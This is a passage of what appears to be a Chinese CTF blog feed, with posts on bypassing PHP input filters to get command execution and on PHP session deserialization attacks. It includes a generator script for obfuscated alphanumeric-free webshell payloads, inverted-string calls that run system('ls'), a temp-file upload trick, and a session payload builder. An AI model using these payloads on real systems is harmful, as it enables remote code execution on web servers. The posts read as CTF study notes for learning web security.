class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$_</span>;<br>这个<span class="hljs-variable">$_</span> 就是S 上面那些就是一个增加的  从A到S<br></code></pre></td></tr></table></figure><p>然后先构造ASS   </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br></code></pre></td></tr></table></figure><p>如果我们要构造E的话首先要把$_ 重新定义成A 上面得$___ 它得值还没有变 根据这个 把<code>$_</code>重新定义成A</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$_</span>=[].<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>];<br><span class="hljs-variable">$__</span>=<span class="hljs-variable">$___</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>.<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$___</span>;<br>++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;++<span class="hljs-variable">$_</span>;<br><span class="hljs-variable">$__</span>.=<span class="hljs-variable">$_</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$__</span>;<br><br></code></pre></td></tr></table></figure><p>下面的都是那样 就不再多说了</p><p>然后下面有一个自增构造的脚本：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$cmd</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-variable">$cmd2</span> = <span class="hljs-title function_ invoke__">strtoupper</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;post&#x27;</span>]);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$_ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">POC2</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>)</span>&#123;<br>    <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;$____ = &quot;_&quot;;$__=$___;&#x27;</span>;<br>    <span class="hljs-variable">$POC_pat1</span> = <span class="hljs-string">&quot;\$__=\$___;&quot;</span>;<br>    <span class="hljs-variable">$POC_pat2</span> = <span class="hljs-string">&quot;\$____ .=\$__;&quot;</span>;<br>    <span class="hljs-keyword">while</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>        <span class="hljs-variable">$str1</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>];<br>        <span class="hljs-variable">$POC1</span> = <span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-variable">$str1</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>)-<span class="hljs-title function_ invoke__">base_convert</span>(<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-string">&quot;A&quot;</span>),<span class="hljs-number">16</span>,<span class="hljs-number">10</span>);<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1</span>) &#123;<br>            <span class="hljs-variable">$POC_pat3</span> = <span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat3</span>;<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-variable">$str2</span> = <span class="hljs-variable">$cmd</span>[<span class="hljs-variable">$i</span>-<span class="hljs-number">1</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$str1</span>==<span class="hljs-variable">$str2</span>)&#123;<br>                <span class="hljs-variable">$POC_pat5</span> = <span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat5</span>;<br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$POC_pat6</span> = <span class="hljs-variable">$POC_pat1</span>.<span class="hljs-title function_ invoke__">str_repeat</span>(<span class="hljs-string">&quot;++\$__;&quot;</span>,<span class="hljs-variable">$POC1</span>).<span class="hljs-variable">$POC_pat2</span>;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat6</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$i</span>++;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd</span>))&#123;<br>    <span class="hljs-variable">$POC_pat7</span> = <span class="hljs-string">&quot;\$_=[].&#x27;&#x27;;\$___=\$_[\$__];\$__=\$___;\$_=\$___;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$POC_pat7</span>;<br>    <span class="hljs-title function_ invoke__">POC</span>(<span class="hljs-variable">$cmd</span>);<br>&#125;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$cmd2</span>))&#123;<br>    <span class="hljs-title function_ invoke__">POC2</span>(<span class="hljs-variable">$cmd2</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>如果要构造<code>assert($_POST[_])</code> 的话 就让cmd=assert post=POST</p><p>有四个下划线的是post的 一个下划线的是cmd的</p><h1 id="特殊符号过滤"><a href="#特殊符号过滤" class="headerlink" title="特殊符号过滤"></a>特殊符号过滤</h1><h3 id="1-对下划线进行一个过滤"><a href="#1-对下划线进行一个过滤" class="headerlink" title="1.对下划线进行一个过滤"></a><strong>1.对下划线进行一个过滤</strong></h3><p>这个可以利用短标签进行一个绕过</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ruby"><span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span><span class="hljs-string">`$_GET[_]`</span><span class="hljs-string">?&gt;</span>  可以将_GET进行一个取反 然后 将_也进行一个取反 <br><br>转换成=&gt;  <span class="hljs-string">?&gt;</span>&lt;<span class="hljs-string">?=</span>&#123;<span class="hljs-variable">$&#123;</span>~<span class="hljs-string">&quot;取反后的字符&quot;</span>&#125;[%a0]&#125;<span class="hljs-string">?&gt;</span>   然后就可以进行一个命令执行  同时改成<span class="hljs-variable constant_">POST</span>也是可以的 只不过将后面的参数换成一个 - 号就行了<br></code></pre></td></tr></table></figure><p>当然异或也是可以的</p><h3 id="2-下划线和-被过滤了"><a href="#2-下划线和-被过滤了" class="headerlink" title="2.下划线和$被过滤了"></a><strong>2.下划线和$被过滤了</strong></h3><p><strong>php7下：</strong></p><p>利用函数<strong>call_user_func()</strong>  进行一个绕过   只在php7后有效($a)();</p><p>call_user_func(‘调用的函数’,’传入的值’)</p><p>对它进行一个取反绕过</p><p>call_user_func =&gt; %9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C</p><p>system =&gt; %8C%86%8C%8B%9A%92</p><p>ls =&gt; %93%8C</p><p>(<del>%9C%9E%93%93%A0%8A%8C%9A%8D%A0%99%8A%91%9C)(</del>%8C%86%8C%8B%9A%92,~%93%8C);  =&gt;(call_user_func)(system,ls);</p><p><img src="https://s2.loli.net/2023/08/25/9kGCNawZQonDh1U.png" alt="image-20230707160430309.png"></p><p><strong>在php5下：</strong></p><p>利用了一个上传临时文件</p><p>参考大佬博客：<a href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html</a></p><p>. file(文件名) 是用来执行一个文件的  </p><p>这个在php5下的绕过思路就是 上传一个文件 php会将我们上传的文件默认保存在/tmp/phpxxxxxx目录下 （xxxxxx 是六个随机的大小写字母）</p><p>然后我们通过通配符? 利用.file 去读取我们上传的文件  这个上传的文件是可控的 所以就可以进行命令执行   大体思路就是这个</p><p>? 代表任意一个字符    </p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-string">``</span>可以用来进行命令执行     <span class="hljs-string">`./???/?????????`</span><br></code></pre></td></tr></table></figure><p>但是这个有不可预知性 可以查的范围太广了    我们注意到后面的xxxxxx是六位随机的大小写字母 在linux中 glob支持利用 [0-9]来表示一个范围</p><p>在ascii码表中  @-[  表示所有大写字母的范围 所以可以利用  [@-[]   我们可以让最后一位是大写的然后这样范围就进一步的缩小了</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">`.<span class="hljs-regexp">/???/</span>?????[@-[]`<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2023/08/25/6l8qaihbTgDzH4P.png" alt="image-20230707175309732.png"></p><p>从User-Agent到最后的话可以复制粘贴</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: Mozilla/<span class="hljs-number">5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64; rv:<span class="hljs-number">79.0</span>) Gecko/<span class="hljs-number">20100101</span> Firefox/<span class="hljs-number">79.0</span><br>Accept: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0.9</span>,image/webp,*<span class="hljs-comment">/*;q=0.8</span><br><span class="hljs-comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="hljs-comment">Content-Type:multipart/form-data;boundary=--------123</span><br><span class="hljs-comment">Accept-Encoding: gzip, deflate</span><br><span class="hljs-comment">Connection: close</span><br><span class="hljs-comment">Upgrade-Insecure-Requests: 1</span><br><span class="hljs-comment">Content-Length: 115</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">----------123</span><br><span class="hljs-comment">Content-Disposition:form-data;name=&quot;file&quot;;filename=&quot;1.txt&quot;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">#!/bin/sh</span><br><span class="hljs-comment">ls /     //进行命令执行</span><br><span class="hljs-comment">----------123--</span><br><span class="hljs-comment"></span><br></code></pre></td></tr></table></figure><h3 id="3-过滤了-amp"><a href="#3-过滤了-amp" class="headerlink" title="3.过滤了~^|;`&amp;"></a><strong>3.过滤了~^|;`&amp;</strong></h3><p>这个时候要用到自增 和短标签结合起来的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">32</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">127</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/[a-zA-Z0-9@#%^&amp;*:&#123;&#125;\-&lt;\?&gt;\&quot;|`~\\\\]/&quot;</span>,<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>)))&#123;   <span class="hljs-comment">//这个正则看题目是什么</span><br>        <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$i</span>).<span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>&#125;<br>?    可以看看没有过滤哪些<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>命令执行</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Session反序列化</title>
    <link href="/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/08/23/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Session反序列化"><a href="#Session反序列化" class="headerlink" title="Session反序列化"></a>Session反序列化</h1><p>具体的什么是session,php session的工作机制是什么，可以参考下面这篇文章：<br><a href="https://xz.aliyun.com/t/6640">https://xz.aliyun.com/t/6640</a></p><p>先来介绍一下session。session是储存在服务器端的数据，相对比cookie来讲更加的安全，因为cookie是储存在客户端的数据。</p><p>​                                              先来看一下几个参数的含义:</p><table><thead><tr><th>Directive</th><th></th></tr></thead><tbody><tr><td>session.save_handler</td><td>session保存形式，默认为files</td></tr><tr><td>session.save_path</td><td>session保存路径</td></tr><tr><td>session.serialize_handler</td><td>session序列化存储所用处理器，默认为php</td></tr><tr><td>session.upload_progress.cleanup</td><td>一旦读取了所有的POST数据，立即清除进度信息。默认开启</td></tr><tr><td>session.upload_progress.enabled</td><td>将上传文件的进度信息存在session中，默认开启</td></tr></tbody></table><p>session反序列漏洞产生的原因就是写入和读取的内容不一样  (就是使用了不同的处理器)</p><p>在php中session有三种反序列化的机制，分别是</p><p><strong>1.php 2.php_serialize 3.php_binary</strong></p><p>它们的序列化的结果是不一样的，下面分别介绍一下。</p><p>1.php ——&gt;键名＋竖线＋经过serialize()函数序列化之后的值</p><p>2.php_serialize ——&gt; 经过serialize()函数序列化处理的数组   使用这个php版本需要大于5.5.4</p><p>3.php_binary ——&gt;  键名长度对应的ASCII码＋键名＋经过serialize()函数序列化后的值  </p><p>比如说：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[name]=<span class="hljs-string">&#x27;jj&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>1.php  ——&gt;name|s:2:”jj”;</p><p>2.php_serialzie ——&gt;a:1:{s:4:”name”;s:2:”jj”;}</p><p>3.php_binary ——&gt; EOTnames:2:”jj”;</p><p>下面举一个简单的例子来说明一下session反序列化的应用</p><p>index.php:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-comment">/*hint.php*/</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;her=<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">10000</span>));<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;name===<span class="hljs-variable language_">$this</span>-&gt;her)&#123;<br>            <span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;flag.php&#x27;</span>);<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这里面hint.php代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;session.serialize_handler&#x27;</span>, <span class="hljs-string">&#x27;php_serialize&#x27;</span>);<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;a&#x27;</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>在index.php中 没有可以输入的点，但是有一个session_start(),可以对session进行一个读取</p><p>然后在hint.php中是一个写入session的，这里写入使用了php_serialize 读取使用了php</p><p>根据它们对session序列化的不同，可以构造恶意的代码，从而去获得flag</p><p>既然读取是php，它会将|后面的内容进行一个反序列化，所以我们可以在序列化好的字符串前面加上一个|</p><p>那么来看这个简单的Flag类，这里利用了引用，就是在某些情况下，两个值不同但获取flag的前提是两个值相同</p><p>所以可以构造：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Flag</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$her</span>;<br>&#125;<br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Flag</span>();<br><span class="hljs-variable">$a</span>-&gt;name=&amp;<span class="hljs-variable">$a</span>-&gt;her;<br><span class="hljs-keyword">echo</span>  <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="没有-SESSION变量赋值的情况"><a href="#没有-SESSION变量赋值的情况" class="headerlink" title="没有$_SESSION变量赋值的情况"></a>没有$_SESSION变量赋值的情况</h1><p>当session.upload_progress.enable 开启时，当上传一个文件时，会对文件上传进度进行一个监测。</p><p>官方来讲就是：当 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.enabled">session.upload_progress.enabled</a> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。</p><p>当一个上传在处理中，同时POST一个与INI中设置的<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>同名变量时，上传进度可以在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中获得。 当PHP检测到这种POST请求时，它会在<a href="http://php.net/manual/zh/reserved.variables.session.php">$_SESSION</a>中添加一组数据, 索引是<a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.prefix">session.upload_progress.prefix</a> 与 <a href="http://php.net/manual/zh/session.configuration.php#ini.session.upload-progress.name">session.upload_progress.name</a>连接在一起的值。</p><p>简单的来讲就是构造一个上传表单，然后抓包，对文件名进行一个修改</p><p>表单代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php">&lt;form action=<span class="hljs-string">&quot;http://example&quot;</span> method=<span class="hljs-string">&quot;POST&quot;</span> enctype=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;<br>    &lt;input type=<span class="hljs-string">&quot;hidden&quot;</span> name=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span>; <span class="hljs-meta">?&gt;</span><span class="hljs-string">&quot; value=&quot;</span><span class="hljs-number">123</span><span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>file<span class="hljs-string">&quot; name=&quot;</span>file<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">    &lt;input type=&quot;</span>submit<span class="hljs-string">&quot; /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br></code></pre></td></tr></table></figure><p>可以看看这篇文章：</p><p><a href="https://www.cnblogs.com/yokan/p/12575371.html">https://www.cnblogs.com/yokan/p/12575371.html</a></p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php反序列化逃逸</title>
    <link href="/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/"/>
    <url>/2023/08/03/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/</url>
    
